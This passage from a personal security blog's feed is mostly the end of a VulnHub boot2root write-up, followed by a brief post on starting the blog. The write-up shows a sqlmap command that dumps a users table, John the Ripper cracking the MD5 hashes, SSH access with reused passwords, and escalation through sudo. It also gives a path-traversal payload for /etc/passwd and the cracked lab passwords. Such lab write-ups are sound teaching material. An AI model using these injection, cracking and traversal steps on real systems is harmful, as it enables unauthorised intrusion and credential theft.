&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;comment&lt;/span&gt;&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;16 tables&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CHARACTER_SETS&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLLATIONS&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLLATION_CHARACTER_SET_APPLICABILITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLUMNS&lt;/span&gt;&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;COLUMN_PRIVILEGES&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;KEY_COLUMN_USAGE&lt;/span&gt;&lt;span class="w"&gt;                      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ROUTINES&lt;/span&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SCHEMATA&lt;/span&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SCHEMA_PRIVILEGES&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;STATISTICS&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TABLES&lt;/span&gt;&lt;span class="w"&gt;                                &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TABLE_CONSTRAINTS&lt;/span&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TABLE_PRIVILEGES&lt;/span&gt;&lt;span class="w"&gt;                      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TRIGGERS&lt;/span&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;USER_PRIVILEGES&lt;/span&gt;&lt;span class="w"&gt;                       &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VIEWS&lt;/span&gt;&lt;span class="w"&gt;                                 &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;17 tables&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+---------------------------------------+&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;user&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;columns_priv&lt;/span&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="w"&gt;                                    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;help_category&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;help_keyword&lt;/span&gt;&lt;span class="w"&gt;                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;help_relation&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;help_topic&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;host&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;proc&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;procs_priv&lt;/span&gt;&lt;span class="w"&gt;                            &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;tables_priv&lt;/span&gt;&lt;span class="w"&gt;                           &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time_zone&lt;/span&gt;&lt;span class="w"&gt;                             &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time_zone_leap_second&lt;/span&gt;&lt;span class="w"&gt;                 &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time_zone_name&lt;/span&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time_zone_transition&lt;/span&gt;&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time_zone_transition_type&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------------------------------------+&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Okay so there is a lot of database let's dump the ehks users table:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;# sqlmap &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;u &amp;#39;http://192&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;168&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;1&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;56/index&lt;/span&gt;&lt;span class="nt"&gt;.&lt;/span&gt;&lt;span class="c"&gt;html?page=blog&amp;amp;title=Blog&amp;amp;id=6&amp;#39; &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;p id &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;D  ehks &lt;/span&gt;&lt;span class="nb"&gt;-&lt;/span&gt;&lt;span class="c"&gt;T user &lt;/span&gt;&lt;span class="nb"&gt;--&lt;/span&gt;&lt;span class="c"&gt;dump&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+---------+-----------+----------------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| user_id | user_name | user_pass                        |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+---------+-----------+----------------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c"&gt;| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;+---------+-----------+----------------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cracking-the-hashes"&gt;Cracking the hashes&lt;/h2&gt;
&lt;p&gt;We save the hahses in a file (option proposed by sqlmap) and we launch john the
ripper on it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#john hashes --format=raw-md5&lt;/span&gt;
&lt;span class="code-line"&gt;sorzek:pacman&lt;/span&gt;
&lt;span class="code-line"&gt;jdurbin:Sue1978&lt;/span&gt;
&lt;span class="code-line"&gt;2 password hashes cracked, 4 left&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We test the cracked password on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the restricted part: there is two text files about how to blog and how to use the web mail&lt;/li&gt;
&lt;li&gt;the admin part: with the two cracked accounts we can only write new article, that is not really useful for our CTF&lt;/li&gt;
&lt;li&gt;the mail part: according to the instruction on the restricted part we can access the user's emails from here.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We found in an email from sorzek to ghighland that he just add a number to is
useual password "undone" so we just tell john to try password from undone0 to
undone9999. We cracked an other password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ghighland&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;undone1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ssh-connexions"&gt;SSH connexions&lt;/h2&gt;
&lt;p&gt;Okay the same password seems to be used everywhere and I was a bit lost to how
to continue so I try the credentials on the ssh service: &lt;em&gt;it works!&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;First of all I logged with the jdurbin account.
There seems to be anything useful but in my search I saw that achen had an
ssh private key readable by everyone (a ppk one for PuTTY).
Okay lets use it to connect on the machine. It ask no password and we got a
shell, what now?&lt;/p&gt;
&lt;h2 id="privileges-escalation"&gt;Privileges escalation&lt;/h2&gt;
&lt;p&gt;I try to see what was the differences with this account and I saw a pdf file
"linux_administration.pdf" so I tried to use the sudo command with &lt;code&gt;sudo -v&lt;/code&gt; and
once again: &lt;em&gt;it works!&lt;/em&gt;
So a simple &lt;code&gt;sudo su&lt;/code&gt; give us the root rights.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;DONE!&lt;/em&gt;&lt;/p&gt;
&lt;h1 id="summary"&gt;Summary&lt;/h1&gt;
&lt;p&gt;Lets resume :&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;exploitation of the SQL injection&lt;/li&gt;
&lt;li&gt;cracked the hashes&lt;/li&gt;
&lt;li&gt;use the credentials on the SSH service&lt;/li&gt;
&lt;li&gt;find the ppk SSH key&lt;/li&gt;
&lt;li&gt;use it to connect on the achen account&lt;/li&gt;
&lt;li&gt;sudo su&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;That was a easy one !&lt;/p&gt;
&lt;h1 id="nota-bene"&gt;Nota bene&lt;/h1&gt;
&lt;p&gt;Oh yeah we do not explore the lead of the file injection in the
page GET parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://192.168.1.56/index.html?page=../../../../../../etc/passwd%00&amp;amp;title=Blog&amp;amp;id=5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Moreover the root password "root1234" where is the &lt;code&gt;bash_history&lt;/code&gt; of achen.&lt;/p&gt;</content><category term="security"></category><category term="challenge"></category><category term="security"></category><category term="vulnhub"></category><category term="boot2root"></category></entry><entry><title>Blog Start</title><link href="https://maggick.fr/2014/08/blog-start.html" rel="alternate"></link><published>2014-08-18T00:00:00+02:00</published><updated>2014-08-18T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-08-18:/2014/08/blog-start.html</id><summary type="html">&lt;p&gt;Today I start my blog using Pelican and hosting it with github pages.
It is located at &lt;a href="https://maggick.fr/blog"&gt;www.maggick.fr/blog&lt;/a&gt;.
On &lt;a href="https://maggick.fr"&gt;www.maggick.fr&lt;/a&gt; you will find a sort
of portal where I redirect travelers to this blog or to my notes located at
&lt;a href="http://www.maggick.fr/notes"&gt;www.maggick.fr/notes&lt;/a&gt;. My …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Today I start my blog using Pelican and hosting it with github pages.
It is located at &lt;a href="https://maggick.fr/blog"&gt;www.maggick.fr/blog&lt;/a&gt;.
On &lt;a href="https://maggick.fr"&gt;www.maggick.fr&lt;/a&gt; you will find a sort
of portal where I redirect travelers to this blog or to my notes located at
&lt;a href="http://www.maggick.fr/notes"&gt;www.maggick.fr/notes&lt;/a&gt;. My notes are is
the place where is store my "how to" and the things that may help other peoples,
they are also hosted with github pages.&lt;/p&gt;
&lt;p&gt;Nevertheless all this notes and all the content of this blog is redacted locally
with vim and then push to github. That means that I have all traces of every
article and every notes redacted here.&lt;/p&gt;
&lt;p&gt;I want to offer a comments solution where
all the comments are stored on my computer but I am not sure it is possible and
I will probably use discuss in a first time.&lt;/p&gt;
&lt;p&gt;The default theme of pelican is awful and I will change it in the next few days.
Hoping that I found one better.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit:&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;29 Oct. 2014: I use discuss for the comments and I use the maggner for pelican
theme. You can read more about the theme in the
&lt;a href="http://www.maggick.fr/blog/2014/10/27/blog-changes.html"&gt;blog changes&lt;/a&gt;
article.&lt;/p&gt;</content><category term="Misc"></category><category term="blog"></category><category term="misc"></category></entry></feed>